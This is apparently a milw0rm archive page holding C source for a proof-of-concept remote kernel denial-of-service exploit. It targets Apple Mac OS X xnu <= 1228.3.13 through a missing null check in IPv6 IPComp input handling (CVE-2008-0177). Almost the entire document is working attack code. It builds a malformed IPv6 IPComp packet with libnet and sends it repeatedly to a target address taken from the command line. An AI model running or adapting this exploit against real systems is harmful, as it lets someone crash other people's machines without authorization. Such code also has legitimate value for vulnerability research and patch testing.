<html><head><title>Apple Mac OS X xnu <= 1228.3.13 ipv6-ipcomp Remote kernel DoS PoC</title></head><pre>/* xnu-ipv6-ipcomp.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X xnu &lt;= 1228.3.13 ipv6-ipcomp remote kernel DoS POC
 * by mu-b - Sun 24 Feb 2008
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *
 * ipcomp6_input does not verify the success of the first call
 * to m_pulldown (m -&gt; md typo?).
 *
 *         md = m_pulldown(m, off, sizeof(*ipcomp), NULL);
 *         if (!m) {
 * -&gt;
 *         md = m_pulldown(m, off, sizeof(*ipcomp), NULL);
 *         if (!md) {
 *                                    (bsd/netinet6/ipcomp_input.c)
 *
 * curiosly the same bug exists in ipcomp4_input, but an explicit
 * check is made to ensure there is enough space for the struct ipcomp.
 *
 * Note: bug independently found by Shoichi Sakane of the KAME project.
 *       (FreeBSD 5.5, 4.9.0 &amp; NetBSD 3.1 also vulnerable)
 *          (http://www.kb.cert.org/vuls/id/110947)
 *          (http://www.securityfocus.com/bid/27642)
 *          (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0177)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;arpa/inet.h&gt;
#include &lt;ifaddrs.h&gt;
#include &lt;libnet.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;unistd.h&gt;

#define IPV6_INTERFACE    &quot;eth0&quot;
#define IPV6_SRC_OFFSET   8
#define IPV6_DST_OFFSET   24

#define HAMMER_NUM        8

static unsigned char pbuf[] = 
  &quot;\x60&quot;
  &quot;\x00\x00\x00&quot;
  &quot;\x00\x00&quot;      /* plen = 0           */
  &quot;\x6c&quot;          /* nxt_hdr = IPComp   */
  &quot;\x66&quot;
  &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;
  &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;;

static int
get_localip (char *if_name, unsigned int *ip6_addr)
{
  struct ifaddrs *ifa_head;
  int result;

  result = -1;
  if (getifaddrs (&amp;ifa_head) == 0)
    {
      struct ifaddrs *ifa_cur;

      ifa_cur = ifa_head;
      for (ifa_cur = ifa_head; ifa_cur; ifa_cur = ifa_cur-&gt;ifa_next)
        {
          if (ifa_cur-&gt;ifa_name != NULL &amp;&amp; ifa_cur-&gt;ifa_addr != NULL)
            {
              if (strcmp (if_name, (char *) ifa_cur-&gt;ifa_name) != 0 ||
                  ifa_cur-&gt;ifa_addr-&gt;sa_family != AF_INET6 ||
                  !(ifa_cur-&gt;ifa_flags &amp; IFF_UP))
                continue;

              memcpy (ip6_addr,
                      &amp;(((struct sockaddr_in6 *) ifa_cur-&gt;ifa_addr)-&gt;sin6_addr),
                      sizeof (int) * 4);
              result = 0;
              break;
            }
        }

      freeifaddrs (ifa_head);
    }

  return (result);
}

int
main (int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE], ip6_buf[128];
  unsigned int i, ip6_addr[4];
  libnet_t *lnsock;

  printf (&quot;Apple MACOS X xnu &lt;= 1228.3.13 ipv6-ipcomp remote kernel DoS PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  if (argc &lt; 2)
    {
      fprintf (stderr, &quot;Usage: %s &lt;dst ipv6&gt;\n&quot;, argv[0]);
      exit (EXIT_FAILURE);
    }

  if (get_localip (IPV6_INTERFACE,
                   (unsigned int *) &amp;pbuf[IPV6_SRC_OFFSET]) &lt; 0)
    {
      fprintf (stderr, &quot;* get_localip() failed\n&quot;);
      exit (EXIT_FAILURE);
    }

  if (inet_pton (AF_INET6, argv[1], ip6_addr) &lt;= 0)
    {
      fprintf (stderr, &quot;* inet_pton() failed\n&quot;);
      exit (EXIT_FAILURE);
    }
  memcpy (&amp;pbuf[IPV6_DST_OFFSET], ip6_addr, sizeof ip6_addr);

  lnsock = libnet_init (LIBNET_RAW6_ADV, NULL, errbuf);
  if (lnsock == NULL)
    {
      fprintf (stderr, &quot;* libnet_init() failed: %s\n&quot;, errbuf);
      exit (EXIT_FAILURE);
    }

  inet_ntop (AF_INET6, &amp;pbuf[IPV6_SRC_OFFSET], ip6_buf, sizeof ip6_buf);
  printf (&quot;* local ipv6 %s...\n&quot;, ip6_buf);
  printf (&quot;* attacking %s...&quot;, argv[1]);
  for (i = 0; i &lt; HAMMER_NUM; i++)
    libnet_write_raw_ipv6 (lnsock, pbuf, sizeof pbuf - 1);
  printf (&quot;done\n&quot;);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2008-02-26]</pre></html>